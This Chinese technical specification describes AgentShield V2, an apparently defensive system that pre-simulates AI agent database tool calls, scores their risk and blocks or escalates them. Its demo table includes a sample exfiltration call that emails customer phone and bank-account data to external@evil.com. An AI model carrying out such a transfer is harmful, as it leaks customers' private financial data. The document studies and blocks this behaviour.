# AgentShield V2 技术说明

> **基于数据库影子预演的 AI Agent 工具调用风险审计系统**  
> **AgentShield V2.0 Baseline**  
> commit: `b629d48` | date: 2026-05-05

---

## 1. V2 定位

AgentShield V2 在 AI Agent 工具调用真正执行前，将工具请求标准化为 `ToolCallRequest`，并通过数据库影子预演机制识别目标表、敏感字段、查询范围、外部传输意图和操作副作用，计算影子风险评分后交由熔断控制器执行放行、人工复核或阻断决策。

核心能力：**数据库工具调用影子预演与熔断拦截**

---

## 2. V1 → V2 的能力升级

| 维度 | V1 | V2 |
|------|----|----|
| **审计对象** | AI输出文本 | 数据库工具调用 |
| **核心能力** | 幻觉检测 + RAG溯源 + 风险熵评分 | 影子预演 + 敏感字段识别 + 外部传输检测 |
| **熔断触发** | 风险熵阈值 | 影子风险评分 >= 0.90 |
| **决策档位** | hard_gate / human_review / pass | allow / human_review / block |
| **审计留痕** | RiskProfile (输出侧) | AuditLogEntry (工具调用侧) |

---

## 3. 核心链路

```
ToolCallRequest (标准化工具调用请求)
  ↓
SQLAnalyzer (SQL结构解析: SELECT/INSERT/UPDATE/DELETE + WHERE提取)
  ↓
DatabaseShadowSimulator (影子预演引擎)
  ├─ TABLE_SENSITIVITY (数据资产敏感度映射)
  ├─ DANGEROUS_OPERATIONS (高风险操作模式库)
  ├─ 预测: predicted_tables / affected_rows_estimate
  ├─ 检测: is_bulk_operation / is_external_transfer
  └─ 输出: ShadowEffect
  ↓
DatabaseShadowRiskScorer (影子风险评分器, 5因子加权)
  ├─ sensitive_data    × 0.85 (敏感数据权重, 最高)
  ├─ data_volume       × 0.05 (数据量权重)
  ├─ bulk_operation    × 0.05 (批量操作权重)
  ├─ external_transfer × 0.03 (外部传输权重)
  └─ operation_type    × 0.02 (操作类型权重)
  ↓
RiskFuseController (熔断控制器)
  ├─ score >= 0.90 → block (高风险阻断)
  ├─ score >= 0.50 → human_review (中风险转人工)
  └─ score <  0.50 → allow (低风险放行)
  ↓
AuditLogEntry (完整风险画像写入审计日志)
```

---

## 4. 核心数据结构

### ToolCallRequest
```python
tool_name: str          # e.g. "cursor.execute", "send_email"
params: dict            # e.g. {"sql": "...", "to": "..."}
agent_id: str           # 调用者身份
session_id: str         # 会话追踪
is_database_tool: bool # 是否为数据库工具
```

### ShadowEffect
```python
predicted_tables: list[str]          # 涉及的表
affected_rows_estimate: int           # 影响行数估算
data_volume_mb: float                # 数据量估算(MB)
sensitive_fields_detected: list[str] # 检测到的敏感字段
is_bulk_operation: bool              # 是否批量操作
is_external_transfer: bool           # 是否外部传输
operation_side_effects: list[str]    # 操作副作用描述
```

### AuditLogEntry
```python
session_id / agent_id / tool_name / params
shadow_risk_score / fuse_action / fuse_reason
simulated_effect / timestamp / recommendation
```

---

## 5. 四类 Demo 验证

| Case | Tool | Input | Score | Action | 验证目标 |
|------|------|-------| -----:|--------|---------|
| 客户敏感字段查询 | `cursor.execute` | `SELECT phone, id_card, address FROM customers WHERE status = 1` | 0.901 | block | 高敏感字段命中，阻断正确 |
| 普通产品查询 | `cursor.execute` | `SELECT name, price FROM products WHERE category = electronics` | 0.051 | allow | 低风险不误伤 |
| 外部邮件+客户数据 | `send_email` | `SELECT phone, bank_account FROM customers` + `to=external@evil.com` | 0.981 | block | 外发风险识别正确 |
| `SELECT *` 批量客户查询 | `cursor.execute` | `SELECT * FROM customers` (无WHERE) | 0.866 | human_review | 大范围访问转人工，合理 |

---

## 6. 技术创新点

### 6.1 工具调用标准化
将不同类型工具的调用抽象为统一 `ToolCallRequest` 格式，实现跨工具类型的一致性审计框架。

### 6.2 数据库影子预演
在真实执行前通过 SQL 结构分析（正则解析 + 表名/字段名提取 + WHERE条件分析）预判工具调用的实际影响，无需实际执行即可识别风险。

### 6.3 数据资产敏感度映射
`TABLE_SENSITIVITY`（表级）+ `_BASE_SENSITIVITY`（字段×表组合级）双层映射，确保敏感数据识别既覆盖表级别风险，又精确到字段级别。

### 6.4 外部副作用识别
通过工具名模式匹配（email/mailto/webhook/upload等）检测工具调用是否意图将数据库查询结果传输到外部系统。

### 6.5 影子风险评分与熔断
5因子加权模型（敏感数据权重0.85主导）确保含敏感字段的查询能冲上0.90+触发阻断，同时通过分层的熔断阈值保留人工复核空间。

---

## 7. 边界处理原则

> **不可解释的工具调用，不自动执行。**

- SQL解析失败 → human_review
- 未知工具类型 → human_review  
- 影子预演异常 → block（保守策略）
- 无WHERE的批量查询 → human_review（不直接阻断，保留人工判断）

---

## 8. V3 扩展路线

| 方向 | 内容 |
|------|------|
| **多工具链** | 文件系统操作、网络请求、第三方API调用审计 |
| **多Agent行为图谱** | 跨Agent调用链追踪，识别Agent间协作产生的风险传播 |
| **风险传播建模** | 单一Agent风险如何沿调用链扩散的建模与可视化 |
| **实时熔断面板** | Dashboard展示实时工具调用审计状态与风险趋势 |

---

## 9. 版本状态

| Version | Capability | Status |
|---------|------------|--------|
| V1 | AI输出合规审计：幻觉检测、RAG溯源、风险熵评分、硬门控、人工复核、审计留痕 | Frozen |
| **V2** | 数据库工具调用影子预演与熔断拦截 | **Baseline committed** |
| V3 | 多Agent行为链治理与风险传播建模 | Planned |

**核心表述**：AgentShield V2 通过数据库影子预演机制，在 AI Agent 工具调用真正执行前识别数据外泄风险并触发熔断，实现了从"模型输出审计"到"Agent行为治理"的能力跨越。